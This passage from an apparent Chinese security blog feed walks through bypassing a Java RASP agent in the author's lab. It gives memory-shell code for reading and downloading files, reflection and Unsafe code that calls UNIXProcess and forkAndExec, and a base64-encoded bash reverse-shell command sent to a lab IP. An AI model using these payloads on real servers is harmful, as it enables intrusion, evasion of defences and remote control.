href="https://xz.aliyun.com/t/9704">https://xz.aliyun.com/t/9704</a><br><a href="https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA">https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA</a><br><a href="https://github.com/pwntester/JRE8u20_RCE_Gadget">https://github.com/pwntester/JRE8u20_RCE_Gadget</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 反序列化漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中的RASP绕过</title>
      <link href="/2023/11/20/rasp%E7%BB%95%E8%BF%87/"/>
      <url>/2023/11/20/rasp%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境的 <code>docker</code> 放到了 <code>https://github.com/justdoit-cai/javaAgent-learn/tree/main/rasp-demo-2.0(with%20executable%20jar%20and%20docker)</code> 中。</p><p>该环境是 <code>jackson</code> 的任意调用 <code>getter</code> 方法漏洞，并且 <code>rasp</code> <code>ban</code> 了 <code>java.lang.ProcessImpl.start()</code> ，并且我们无法调用 <code>Runtime.exec()</code> ，因为这个方法底层调的也是 <code>ProcessImpl.start()</code> 。</p><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><p>具有漏洞的环境首先是想反弹 <code>shell</code> ，如果不出网就想打入内存马。我们直接开始尝试打入内存马。这里想直接反弹 <code>shell</code> 也不行，因为上面说了这里靶场具有 <code>RASP</code> 保护， <code>ban</code> 了命令执行（可能有其它命令执行的方法可以绕过，但是我也不知道有没有，应该是没有的，即使有大概率 <code>RASP</code> 也会继续 <code>ban</code> ）。</p><p>打入内存马的 <code>exp</code> 也放到了上面的 <code>github</code> 中。我们这里直接尝试打入内存马。</p><p><img src="/imgs/1700207876273.png"></p><p>发现打入成功了，但是命令没有回显。我们查看靶场的日志信息，发现果然是因为 <code>RASP</code> 的问题。</p><p><img src="/imgs/1700207910679.png"></p><p>但是作为入侵者的我们只知道命令没有执行成功，不知道为什么。我们需要想办法探测原因。我们首先可以猜测后端可能禁止了命令执行相关的方法，于是我们这里可以尝试在注入内存马的时候不执行命令，而是读文件。修改后的读文件内存马 <code>exp</code> 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evilFunc</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">java.io.<span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">printWriter.write(<span class="string">&quot;memshell inject success&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">urlContent</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(request.getParameter(<span class="string">&quot;read&quot;</span>));</span><br><span class="line"><span class="keyword">final</span> <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">InputStreamReader</span>(url.openStream()));</span><br><span class="line"><span class="type">String</span> <span class="variable">inputLine</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">urlContent = urlContent + inputLine + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">printWriter.println(urlContent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现可以成功读取文件，说明内存马没问题。</p><p><img src="/imgs/1700208497085.png"></p><p>接着我们在 <code>/app</code> 目录下发现了 <code>myRasp.jar</code> ，于是就发现了这里是存在 <code>RASP</code> 的。</p><p><img src="/imgs/1700208535001.png"></p><p>于是我们可以想办法把 <code>myRasp.jar</code> 下下来分析。这里直接在 <code>response</code> 中返回指定的文件流就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evilFunc</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,String.format(<span class="string">&quot;attachment; filename=%s&quot;</span>, filename));</span><br><span class="line">        <span class="comment">// 获取文件输入流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Files.newInputStream(Paths.get(filename));</span><br><span class="line">        <span class="comment">// 获取响应输出流</span></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        <span class="comment">// 将文件内容写入响应输出流</span></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭流资源</span></span><br><span class="line">        outputStream.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>成功读取！</p><p><img src="/imgs/1700209308875.png"></p><p>接着我们分析这个 <code>jar</code> 包，发现其核心就是过滤了 <code>processImpl.start()</code> 方法的调用。这里我们可以采用下面的方式绕过。</p><h1 id="绕过一：使用被ban方法的更底层方法"><a href="#绕过一：使用被ban方法的更底层方法" class="headerlink" title="绕过一：使用被ban方法的更底层方法"></a>绕过一：使用被ban方法的更底层方法</h1><p>这里 <code>RASP</code> 只过滤了 <code>processImpl.start()</code> ，我们查看这个方法的实现可以发现更底层的调用。</p><blockquote><p><code>UNIXProcess</code> 和 <code>ProcessImpl</code> 可以理解本就是一个东西，在 <code>JDK9</code> 的时候把 <code>UNIXProcess</code> 合并到了<code>ProcessImpl</code> 。<code>UNIXProcess.forAndExec()</code> 最终调用的是系统级别的 <code>api</code> <code>fork()</code> -&gt; <code>exec()</code> 。 </p></blockquote><p><img src="/imgs/Pasted%20image%2020231117171610.png"></p><p>由于可以知道当前靶场的环境是 <code>jdk8</code> + <code>Linux</code>，因此我们试着通过 <code>UNIXProcess</code> 来 <code>RCE</code> 。</p><h2 id="方式一：new-UNIXProcesss"><a href="#方式一：new-UNIXProcesss" class="headerlink" title="方式一：new UNIXProcesss()"></a>方式一：new UNIXProcesss()</h2><p>通过分析 <code>ProcessImpl</code> 在 <code>start</code> 方法里面传入 <code>new UNIXProcess(xxx)</code> 参数的逻辑，我们可以得到这里的 <code>toCString(cmdarray[0])</code> 是 <code>cmd</code> 第一位的字节数组最后拼接 <code>\0</code> ；关键是这里的 <code>argBlock</code> ， <code>argBlock</code> 是 <code>cmd</code> 后面的所有位的字节数组通过 <code>\0</code> 拼接起来，末尾最后也要加 <code>\0</code> ；<code>args.length</code> 为 <code>cmd.length - 1</code> ；<code>std_fds</code> 为 <code>[-1,-1,-1]</code> 即可。其余参数要么为 <code>null</code> 要么为 <code>0</code> 即可。</p><p>举个例子，对于命令 <code>cmd = [&#39;bash&#39;, &#39;-c&#39;, &#39;&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTYzLjEzMy8xMDAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;]</code> 。<br>其中 <code>argBlock</code> 为 <code>-c</code> 的字节数组加上 <code>\0</code> ，再加上 <code>&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTYzLjEzMy8xMDAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code> 的字节数组，再加上 <code>\0</code> 。</p><p><img src="/imgs/1700239944863.png"></p><p>最后的 <code>poc</code> 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evilFunc</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">String[] cmds = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(<span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; cmds.length; i++) &#123;</span><br><span class="line"><span class="type">byte</span>[] cString = toCString(cmds[i]);</span><br><span class="line"><span class="type">byte</span>[] tmp = <span class="keyword">new</span> <span class="title class_">byte</span>[length + cString.length];</span><br><span class="line">System.arraycopy(argBlock, <span class="number">0</span>, tmp, <span class="number">0</span>, length);</span><br><span class="line">System.arraycopy(cString, <span class="number">0</span>, tmp, length, cString.length);</span><br><span class="line">argBlock = tmp;</span><br><span class="line">length += cString.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) constructor.newInstance(toCString(cmds[<span class="number">0</span>]), argBlock, cmds.length - <span class="number">1</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;, <span class="literal">false</span>);</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> ((len = ins.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(len);</span><br><span class="line">os.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">&#125;</span><br><span class="line">os.close();</span><br><span class="line">ins.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] toCString(String source) &#123;</span><br><span class="line"><span class="type">byte</span>[] src = source.getBytes();</span><br><span class="line"><span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[src.length + <span class="number">1</span>];</span><br><span class="line">System.arraycopy(src, <span class="number">0</span>, result, <span class="number">0</span>, src.length);</span><br><span class="line">result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传内存马后，我们就可以用下面的 <code>exp</code> 来反弹 <code>shell</code> 或者执行其它命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://192.168.163.129:8080/backdoor&#x27;</span>  </span><br><span class="line">data = &#123;  </span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: [<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTYzLjEzMy8xMDAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>]</span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">print</span>(requests.post(url=url, data=data).text)</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020231119180910.png"></p><h2 id="方式二：forkAndExec-Unsafe"><a href="#方式二：forkAndExec-Unsafe" class="headerlink" title="方式二：forkAndExec+Unsafe"></a>方式二：forkAndExec+Unsafe</h2><blockquote><p>如果 <code>RASP</code> 禁止了调用 <code>UNIXProcess</code> 的构造方法又怎么办？</p></blockquote><p>其实我们可以利用 <code>Java</code> 的几个特性就可以绕过 <code>RASP </code>执行本地命令了，具体步骤如下:</p><ol><li>使用 <code>sun.misc.Unsafe.allocateInstance(Class)</code> 特性可以无需 <code>new</code> 或者 <code>newInstance</code> 创建<code>UNIXProcess/ProcessImpl</code> 类对象。</li><li>反射 <code>UNIXProcess/ProcessImpl</code> 类的 <code>forkAndExec</code> 方法。</li><li>构造 <code>forkAndExec</code> 需要的参数并调用。</li><li>反射 <code>UNIXProcess/ProcessImpl</code> 类的 <code>initStreams</code> 方法初始化输入输出结果流对象。</li><li>反射 <code>UNIXProcess/ProcessImpl</code> 类的 <code>getInputStream</code> 方法获取本地命令执行结果（如果要输出流、异常流反射对应方法即可）。</li></ol><p><img src="/imgs/1700394593821.png"></p><p><img src="/imgs/1700412101791.png"></p><p>这里需要注意的是 <code>forkAndExec</code> 需要知道 <code>launchMechanism.ordinal()</code> 和 <code>helperpath</code> ，但是还好 <code>launchMechanism</code> 和 <code>helperpath</code> 都是静态属性，我们可以在得到 <code>UNIXProcess</code> 的对象后直接获取就可以了，不用再麻烦考虑这两个属性是怎么赋值的，因为获取到类对象的时候 <code>static</code> 变量就已经赋值了。</p><p>但是光调用了 <code>forkAndExec</code> 方法只能返回命令的 <code>pid</code> ，无法返回命令执行的结果。所以我们还需要审计看如何可以获取命令执行的输出流。</p><p><img src="/imgs/1700412172492.png"></p><p>我们可以知道 <code>UNIXProcess</code> 的构造方法在调用了 <code>forkAndExec</code> 方法之后就只调用了 <code>initStreams</code> 方法，然后就可以通过 <code>getInputStream</code> 获取返回的命令执行结果。所以我们也可以照着做，先通过反射调用 <code>initStreams</code> 方法，然后通过反射调用 <code>getInputStream</code> 方法。就可以获取命令执行的结果了，</p><p>下面是代码实现和执行结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toCString(String source) &#123;</span><br><span class="line">        <span class="type">byte</span>[] src = source.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[src.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(src, <span class="number">0</span>, result, <span class="number">0</span>, src.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取命令</span></span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;ls&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取Unsafe类对象</span></span><br><span class="line">        Class&lt;?&gt; unsafeClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; unsafeConstructor = unsafeClass.getDeclaredConstructor();</span><br><span class="line">        unsafeConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeConstructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过Unsafe绕过构造方法创建UNIXProcess类的实例对象</span></span><br><span class="line">        Class&lt;?&gt; unixProcessClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">unixProcessObject</span> <span class="operator">=</span> unsafe.allocateInstance(unixProcessClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从UNIXProcess中通过反射获取forkAndExec方法需要的参数（前两个参数是静态属性，可以直接反射获取）：1. ordinal. 2. helperpath. 3. argBlock</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> unixProcessClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span> <span class="operator">=</span> unixProcessClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line"></span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(unixProcessObject);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpath = (<span class="type">byte</span>[]) helperpathField.get(unixProcessObject);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;ordinal = &quot;</span> + ordinal);</span><br><span class="line">        System.out.println(<span class="string">&quot;helperpath = &quot;</span> + Arrays.toString(helperpath));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据cmds计算argBlock</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; cmds.length; i++) &#123;</span><br><span class="line">            <span class="type">byte</span>[] cString = toCString(cmds[i]);</span><br><span class="line">            <span class="type">byte</span>[] tmp = <span class="keyword">new</span> <span class="title class_">byte</span>[length + cString.length];</span><br><span class="line">            System.arraycopy(argBlock, <span class="number">0</span>, tmp, <span class="number">0</span>, length);</span><br><span class="line">            System.arraycopy(cString, <span class="number">0</span>, tmp, length, cString.length);</span><br><span class="line">            argBlock = tmp;</span><br><span class="line">            length += cString.length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] std_fds = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取forkAndExec方法并调用这个方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkAndExec</span> <span class="operator">=</span> unixProcessClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        forkAndExec.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(unixProcessObject);</span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkAndExec.invoke(unixProcessObject, ordinal + <span class="number">1</span>, helperpath, toCString(cmds[<span class="number">0</span>]), argBlock, cmds.length - <span class="number">1</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="literal">null</span>, std_fds, <span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;pid = &quot;</span> + pid);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> unixProcessClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(unixProcessObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> unixProcessClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(unixProcessObject);</span><br><span class="line"></span><br><span class="line">        System.out.println(ins);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(ins, StandardCharsets.UTF_8));</span><br><span class="line">        String s;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> ((s = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">            sb.append(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1700413239954.png"></p><p>接着我们把上面的代码融入内存马，最后的 <code>exp</code> 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evilFunc</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">// 获取命令</span></span><br><span class="line">String[] cmds = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Unsafe类对象</span></span><br><span class="line">Class&lt;?&gt; unsafeClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; unsafeConstructor = unsafeClass.getDeclaredConstructor();</span><br><span 